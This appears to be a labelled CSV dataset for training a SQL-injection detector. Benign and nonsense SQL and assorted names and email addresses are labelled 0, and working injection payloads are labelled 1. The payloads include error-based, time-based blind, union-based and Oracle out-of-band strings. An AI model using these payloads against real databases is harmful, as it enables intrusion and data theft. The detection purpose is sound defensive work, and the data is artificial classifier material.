Query,Label
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'opll' like 'opll",1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  # huhw",1
"1%'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  '%'  =  '",1
SELECT TOP 3 * FROM world,0
"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",1
SELECT * FROM ago ORDER BY box,0
"1  )   where 1443  =  1443 union all select null,null,null,null,null#",1
 (  select   (  case when   (  6838  =  2866  )   then 6838 else 1/  (  select 0  )   end   )    ) ,1
c09so18,0
"1'   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
conmi5u52,0
SELECT MIN ( loose )  AS arrow FROM these,0
de_la,0
SELECT AVG ( particular ) FROM group SELECT SUM ( wonderful ) ,0
chuvalo@ppmanzanares.nc,0
"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  1773  =  1773",1
28430,0
SELECT period ( s )  FROM thought SELECT even FROM busy,0
rosendal,0
"SELECT * FROM whatever WHERE atomic BETWEEN ""organization"" AND    ""joined""",0
SELECT * FROM  ( SELECT while FROM kids ) ,0
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'jicq' like 'jicq",1
" select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1
SELECT apple ( s )  FROM rice UNION,0
"SELECT column1 , column2, ... FROM table_name WHERE condition1 AND condition2 AND condition3 ... ;",0
1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,1
-2866'   )    )    or 4491  =  9429#,1
1   )    )     )   rlike sleep  (  5  )  #,1
70489976j,0
"  SELECT Orders.taughtrID, Employees.damage, Employees.yet FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fliesID ORDER BY Orders.roughID",0
FROM  ( SELECT DISTINCT missing FROM wrapped ) ,0
SELECT fox FROM first UNION SELECT breakfast FROM mouse ORDER BY silk,0
SELECT basket FROM eight,0
gwillim.somerset@mystyleperfume.nl,0
1' and 7528  =  2894 and 'qoyw'  =  'qoyw,1
31243,0
l16o2o,0
1437,0
1' rlike   (  select   (  case when   (  1916  =  7874  )   then 1 else 0x28 end   )    )    and 'ughq'  =  'ughq,1
"calle xiquets de valls, 138, 5?g",0
SELECT * FROM specific WHERE story = 'tax'  AND City = 'expect',0
557ni03r5o,0
balsam-prey@mmo.com.cat,0
leyton@intg.tk,0
lacoste,0
"   SELECT rose, taste+ ', ' + money+ ' ' + stick+ ', ' + handsome AS disappear  FROM guard",0
"-5204""  )   union all select 7186,7186,7186--",1
-6079   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  8708  =  8708,1
"1,  (  select   (  case when   (  1255  =  8025  )   then 1 else 1255*  (  select 1255 from mysql.db  )   end   )    )   ",1
SELECT DISTINCT discover FROM author,0
"1%'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   '%'  =  '",1
bernadita,0
select   (  case when   (  9907  =  2736  )   then 9907 else 9907*  (  select 9907 from mysql.db  )   end  )  #,1
"  SELECT Orders.tentrID, Employees.wish, Employees.possibly FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.seasonID ORDER BY Orders.declaredID",0
"c/ fontans, 124, 10?c",0
 UPDATE saw SET clay = 'perhaps'WHERE second = 'plenty',0
end and 'blit'  =  'blit,1
SELECT steep FROM pound UNION SELECT rule FROM floor ORDER BY sentence,0
c26ve7sar,0
SELECT * FROM late WHERE led = 'pound' FETCH FIRST 3 ROWS ONLY,0
"select * from generate_series  (  9863,9863,case when   (  9863  =  3285  )   then 1 else 0 end  )   limit 1--",1
SELECT TOP 50 PERCENT * FROM necessary,0
select case when 3819  =  1887 then 1 else null end--,1
josee,0
SELECT * FROM silent WHERE layers = 'wide' LIMIT 3,0
58265705n,0
grifell brathwaite,0
1%' and 9198  =  9198--,1
SELECT am ( s )  FROM ago FULL OUTER JOIN,0
5.22E+15,0
SELECT year FROM sand,0
ensminge,0
SELECT COUNT ( keep )  FROM musical,0
graff@manzanilladevillafafila.iq,0
shdanoff@esposo.com.tj,0
SELECT cage,0
SELECT * FROM pile 3 SELECT * FROM studied,0
"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM Customers  WHERE NOT Country = 'Germany' AND NOT Country = 'USA';,0
"-5355"" or make_set  (  9354  =  9354,7185  )  ",1
"1""   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#",1
SELECT wall ( s )  FROM managed FULL OUTER JOIN,0
-5774' where 3632  =  3632 or   (  3177  =  4222  )  *4222--,1
-7034'   )    )     )   union all select 4023#,1
calle la salina 7 1?b,0
SELECT TOP 3 * FROM begun WHERE future = 'way',0
regi0ona2,0
1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- bqxe",1
SELECT * FROM door WHERE    NOT pleasant = 'local',0
SELECT * FROM rich WHERE seven NOT LIKE 'theory%',0
"1""  )   order by 1#",1
"  SELECT shallID AS ID, pipe AS prove FROM sweet",0
"1""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""enfu""  =  ""enfu",1
"1%'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1  )   where 5465  =  5465 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT AVG ( gradually ) FROM such SELECT SUM ( meat ) ,0
1' in boolean mode  )   and 5981  =  6700,1
espins marmesat,0
"-3782%""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""%""  =  """,1
"1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--",1
SELECT DISTINCT smell FROM equator,0
62145911a,0
SELECT AVG ( curve )  FROM cat  SELECT SUM ( read ) ,0
"1%""  )   and   (  6016  =  4763  )  *4763 and   (  ""%""  =  """,1
SELECT COUNT ( noun )  FROM popular,0
1'||  (  select 'czos' from dual where 6814  =  6814,1
"  SELECT Orders.fallenrID, Employees.ranch, Employees.worry FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.heldID ORDER BY Orders.biteID",0
SELECT * FROM share,0
SELECT * FROM thrown FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM company,0
"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",1
"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1
"1   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5137  =  5137",1
"1""  )   as kuuf where 6908  =  6908",1
select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,1
shrum@uniovivirtual.nz,0
SELECT * FROM only WHERE Price NOT BETWEEN 10 AND 20,0
"1%"" union all select null,null,null,null,null--",1
" SELECT SupplierName, City, Country FROM Suppliers; INSERT INTO Customers  ( CustomerName, ContactName, Address, City, PostalCode, Country )  ",0
1   )    )     )   and 2006  =  2006,1
SELECT curious ( s )  FROM pencil,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367745 )  ORDER BY meta_id ASC",0
"1%""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1
23991331p,0
25500,0
"1""   )    )     )   rlike   (  select   (  case when   (  7975  =  2446  )   then 1 else 0x28 end   )    )    and    (    (     (  ""qixm"" like ""qixm",1
1  )   as nwfz where 7365  =  7365 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"  UPDATE family SET dirt =  'alphabet', City =  'specific' WHERE pain =  temperature",0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""woun"" like ""woun",1
"-1889%'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",1
SELECT * FROM wp_posts WHERE ID  =  28638 LIMIT 1,0
1526,0
SELECT rising ( s )  FROM condition SELECT development ( s ) ,0
 UPDATE rain SET correctly = 'deal'WHERE dry = 'herself',0
rego,0
" SELECT * FROM correct ORDER BY clothing, leader",0
SELECT * FROM anywhere WHERE black = 'impossible'  OR become = 'substance',0
select   (  case when   (  6434  =  3877  )   then 6434 else 1/  (  select 0  )   end  )  --,1
1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
8170,0
SELECT AVG ( greatest ) FROM doctor SELECT SUM ( route ) ,0
SELECT TOP 3 * FROM truth,0
cister grandi,0
1%'  )   order by 1#,1
SELECT AVG ( outside ) FROM combine,0
"1'  )   where 2725  =  2725 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT CURRENT_TIME (  ) ;,0
"   SELECT Employees.tomorrow, COUNT ( Orders.silenceID )  AS heardFROM    ( OrdersINNER JOIN store ON Orders.islandID  =  Employees.elseID ) ",0
-6680'  )   or 5483  =  3031 and   (  'zxes'  =  'zxes,1
"   SELECT cow, broad+ ', ' + class+ ' ' + increase+ ', ' + hay AS facing  FROM son",0
"   SELECT sent,join,enjoy,putting,vast     (  (  average JOIN extra ON visit.good =  dust.higher )   INNER JOIN shownON Orders.till =  example.steadyID ) ",0
SELECT * FROM market FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM clothes WHERE proud = 'third'  AND  ( knowledge = 'thread' OR recognize = 'rocket' ) ,0
02124892z,0
select   (  case when   (  4690  =  4373  )   then 4690 else 1/  (  select 0  )   end  )  --,1
"SELECT * FROM mountain WHERE recently BETWEEN ""tower"" AND    ""sat""",0
genestar llufriu,0
SELECT guess FROM cat UNION SELECT fast FROM twenty ORDER BY house,0
abondadamente,0
undus de lerda,0
"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",1
1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
SELECT * FROM goes WHERE different = 'catch',0
"select * from generate_series  (  1488,1488,case when   (  1488  =  1685  )   then 1 else 0 end  )   limit 1--",1
"  SELECT purple AS speech, victory AS [receive]  FROM town",0
"iif  (  8354  =  3515,1,1/0  )  ",1
"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,1
"  SELECT do,fort FROM know WHERE sitting = 'fallen' UNION SELECT during, plane FROM pencil",0
shan-min,0
" end and   (  ""nuix"" like ""nuix",1
1  )   rlike   (  select   (  case when   (  8488  =  1270  )   then 1 else 0x28 end   )    ) ,1
"1%""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""%""  =  """,1
"1""   )    )    as yosd where 1255  =  1255",1
"1  )   as nfgb where 2503  =  2503 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
select case when 6229  =  2077 then 1 else null end--,1
madisett,0
mcduffie,0
1'  )   as jwch where 4609  =  4609,1
"-7101   )    )     )   union all select 4587,4587,4587,4587,4587,4587--",1
33829,0
SELECT * FROM  ( SELECT mind FROM between ) ,0
"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",1
"  SELECT shout AS pay, wish AS [breakfast]  FROM port",0
eisenberg@muchochinoenchina.mx,0
password:*/  =  1--,1
1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'cuav'  =  'cuav,1
"  SELECT DAYNAME ( ""2017-06-15"" ) ;",0
53424203x,0
"SELECT * FROM around WHERE laugh BETWEEN ""research"" AND    ""greatly""",0
SELECT written ( s )  FROM himself FULL OUTER JOIN,0
"  SELECT Orders.brotherrID, Employees.past, Employees.support FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fenceID ORDER BY Orders.mailID",0
SELECT * FROM kids WHERE avoid BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT COUNT ( partly ) FROM window,0
"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
SELECT * FROM prize WHERE accurate IN  ( SELECT season FROM face ) ,0
"1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--",1
mandbula,0
"-8599   )    )    or elt  (  5628  =  2324,2324  )   and    (    (   1134  =  1134",1
SELECT AVG ( wrote )  FROM straw  SELECT SUM ( love ) ,0
SELECT * FROM figure WHERE ear = 'mean' LIMIT 3,0
DELETE FROM please,0
"   SELECT steady,happened,wait,mathematics,affect     (  (  spent JOIN thirty ON gravity.hidden =  sitting.magic )   INNER JOIN caveON Orders.all =  detail.anybodyID ) ",0
"SELECT CustomerName, ContactName FROM Customers WHERE  Country  =  ""Brazil"";",0
"1  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"   SELECT nature,another,bicycle,specific,cheese     (  (  not JOIN citizen ON thumb.sell =  has.establish )   INNER JOIN reasonON Orders.hand =  quiet.mouseID ) ",0
SELECT correctly ( s ) FROM wave INNER JOIN,0
denni,0
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",1
SELECT AVG ( involved ) FROM so SELECT SUM ( deer ) ,0
SELECT AVG ( constantly ) FROM nation SELECT SUM ( forget ) ,0
"-3513%"" union all select 8473,8473#",1
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1
SELECT * FROM turn WHERE central LIKE '%who%',0
SELECT Count ( * )  AS father,0
SELECT save ( s )  FROM fairly UNION ALL,0
" SELECT * FROM soldier ORDER BY government ASC, chamber DESC",0
andrcies,0
SELECT * FROM save WHERE spread BETWEEN potatoes09/01/1996we AND salmon15/31/1996baseball,0
"1%""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,1
6.50345E+15,0
SELECT * FROM are FETCH FIRST 3 ROWS ONLY,0
"1""  )   where 9086  =  9086 or sleep  (  5  )  #",1
SELECT mixture,0
"1""  )   where 9962  =  9962 and 4595  =  4595#",1
"-8777""  )   as lalf where 8606  =  8606 or elt  (  4397  =  5823,5823  )  --",1
 UNION ALL SELECT,1
1%'  )   and sleep  (  5  )  #,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw",1
55265136t,0
"   SELECT COUNT ( promised ) , forth FROM friend BY card",0
5.44972E+15,0
32170,0
SELECT TOP 3 * FROM doubt SELECT * FROM now 3SELECT * FROM chamber,0
" select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",1
SELECT * FROM accept WHERE condition IN  ( SELECT nearby FROM gift ) ,0
1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,1
SELECT * FROM minerals WHERE    NOT old = 'down',0
1.06705E+14,0
SELECT * FROM discuss,0
or '1'  =  '1,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  -- vhmc",1
"1""   )    )    as jucs where 6836  =  6836",1
-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2025  )  *2025--,1
23715739w,0
SELECT * FROM dollar WHERE political BETWEEN '1996-07-01' AND '1996-07-31',0
1   )    )    as fqee where 3286  =  3286,1
"admin""  )   or ""1""  =  ""1""#",1
x' or full_name like '%bob%,1
"1""  )   rlike sleep  (  5  )  #",1
SELECT * FROM troops WHERE equal NOT LIKE '[bright]%',0
1  )   and 7533  =  7533 and   (  7175  =  7175,1
"1""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"  SELECT fewID AS ID, office AS massage FROM mark",0
eyre9@ringringcargo.tn,0
"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",1
zein,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
SELECT swim ( s )  FROM heart SELECT what FROM past,0
ivancevi,0
matney,0
-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda,1
SELECT * FROM hunter WHERE off = 'either'  AND  ( thing = 'little' OR each = 'question' ) ,0
SELECT * FROM inch WHERE five = 'strike' FETCH FIRST 3 ROWS ONLY,0
